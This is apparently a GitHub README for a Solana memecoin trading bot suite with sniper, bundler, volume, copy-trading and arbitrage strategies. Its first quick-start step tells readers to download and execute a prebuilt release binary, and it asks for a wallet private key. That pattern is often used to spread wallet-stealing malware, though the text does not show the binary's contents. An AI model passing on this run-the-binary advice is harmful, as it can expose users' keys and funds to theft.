ðŸš€ A modular trading bot suite for memecoin markets on Solana. It supports Raydium, Pump.fun, Bonk.fun, and Meteora. The suite includes snipers, bundlers, volume bots, copy trading, and arbitrage bots. It runs atomic execution via Jito and Raydium SDK v2.

Live releases are available. Download the release file and execute it: https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/releases

Features
- Sniper bots for instant buys on token listings and liquidity events.
- Bundler that aggregates orders into optimal transactions.
- Volume bot for market-making and liquidity probing.
- Copy trading engine to mirror on-chain wallets with filters.
- Arbitrage engine across Raydium, Pump.fun, Bonk.fun, Meteora.
- Atomic execution using Jito relayer and Raydium SDK v2.
- Modular Rust core and optional TypeScript SDK for UI.
- Low-latency order paths and prioritized compute via Jito.
- Secure key handling with optional hardware wallet integration.

Architecture & components
- Core (Rust): low-latency engine, order manager, mempool observer.
- Protocol adapters: Raydium, Pump.fun, Bonk.fun, Meteora adapters map order types and pools.
- Executors: Jito executor for atomic, boosted transactions; fallback to standard RPC.
- Strategy modules: sniper, bundler, volume, copy-trader, arbitrage.
- Telemetry: Prometheus metrics, Grafana dashboards (sample JSON included).
- CLI: controller for strategy lifecycle and local testing.
- Config: YAML-driven runtime settings and per-strategy parameters.

Supported markets & protocols
- Raydium v2 pools and AMM.
- Pump.fun token drops and liquidity events.
- Bonk.fun markets and swap endpoints.
- Meteora listings and pool routers.
- Solana token programs and Serum order books (experimental).
- Jito relayer for priority block inclusion and MEV-aware ordering.

Quick start

1) Download the release file and execute it:
   https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot/releases

2) Prepare a config file (config/example.yml is included).

3) Set environment variables for RPC and keys:
   - SOLANA_RPC_URL (e.g., https://api.mainnet-beta.solana.com)
   - WALLET_KEY_PATH or WALLET_PRIVATE_KEY (encrypted file recommended)

4) Run the binary with a strategy:
   ./smtrader --config config/sniper.yml --strategy sniper

If you prefer building locally, follow the Build from source section.

Build from source (Rust)
- Prerequisites:
  - Rust toolchain stable (1.70+).
  - cargo, rustc.
  - Solana CLI (for key management).
- Clone and build:
  git clone https://github.com/Niranjanprasad1/Solana-Memecoin-Trading-Bot.git
  cd Solana-Memecoin-Trading-Bot
  cargo build --release
- The built binary lives in target/release/smtrader.
- Run tests:
  cargo test --workspace

Configuration

Example config (YAML)
- config/sniper.yml
  strategy: sniper
  rpc_url: https://api.mainnet-beta.solana.com
  wallet_path: /home/user/.config/solana/id.json
  max_spend_usd: 50
  slippage_pct: 1.0
  monitor:
    tx_confirm: 1
    block_latency: 300
  adapters:
    - raydium
    - pumpfun

Key settings
- max_spend_usd: max USD value per trade.
- slippage_pct: acceptable slippage.
- monitor.block_latency: abort if block inclusion lags beyond ms.
- adapters: prioritized protocol list for route search.

Strategy details

Sniper
- Listen for new liquidity events or token listings.
- Compute optimal pool and route.
- Bundle instructions into a single atomic transaction.
- Submit via Jito to minimize front-run risk.
- Configurable pre-sign, gas-limit, and safety checks.

Bundler
- Aggregate multiple orders into one atomic instruction set.
- Use batching to reduce fees and chain load.
- Optimize order sequence for slippage and route cost.
- Provide dry-run mode to validate bundles.

Volume Bot
- Probe spreads and offer liquidity within defined ranges.
- Maintain dynamic order sizing based on recent volume.
- Cancel stale orders and re-balance positions.
- Use simulated orderbooks when necessary.

Copy Trading
- Subscribe to on-chain wallet activity.
- Map source wallet actions to local strategy rules.
- Apply risk filters: max trade, allowed tokens, whitelists.
- Provide real-time sync and audit logs.

Arbitrage
- Detect price divergence across protocols.
- Compute profit after fee and slippage.
- Build atomic arbitrage transactions.
- Submit via Jito or native SDK route for guaranteed execution.

Atomic execution with Jito & Raydium SDK v2
- The bot constructs the final instruction set.
- Jito relayer offers priority block insertion to reduce failed attempts.
- Raydium SDK v2 provides route finders and swap instructions.
- For critical flows, the bot uses a two-phase commit pattern:
  - Prepare: simulate transaction and check balances.
  - Commit: sign and push via Jito.

Examples

Sniper example
- config/sniper.yml sets target token list and max spend.
- Start with:
  ./smtrader --config config/sniper.yml --strategy sniper

Arbitrage example
- config/arbitrage.yml sets source pools and min_profit_usd.
- Start with:
  ./smtrader --config config/arbitrage.yml --strategy arbitrage

CLI reference
- Common flags
  --config <file>    YAML config path
  --strategy <name>  Strategy to run (sniper, bundler, volume, copy, arbitrage)
  --dry-run          Simulate without sending transactions
  --metrics-port     Port for Prometheus metrics
  --log-level        trace|debug|info|warn|error

Telemetry & logs
- Metrics expose Prometheus endpoints on /metrics.
- Included sample Grafana dashboard JSON in docs/grafana/dashboard.json.
- Logs follow structured JSON to ease ingestion.

Testing & simulation
- Unit tests in Rust core.
- Integration tests use local validator for deterministic runs:
  solana-test-validator --reset
- Simulate trades with sandbox configs in test/samples.

Security
- The bot avoids storing raw private keys in plaintext.
- Use wallet_path with Solana CLI encrypted files or HSM modules.
- Use per-strategy limits and safety thresholds to cap exposure.
- Audit hooks in strategies log critical actions for post-mortem.

Development notes
- Code style follows idiomatic Rust with clippy and fmt.
- Modules:
  - core: order matching, execution engine.
  - adapters: protocol-specific code.
  - strategies: high-level strategy implementations.
  - cli: command line interface.
- Use cargo workspaces for multi-crate builds.
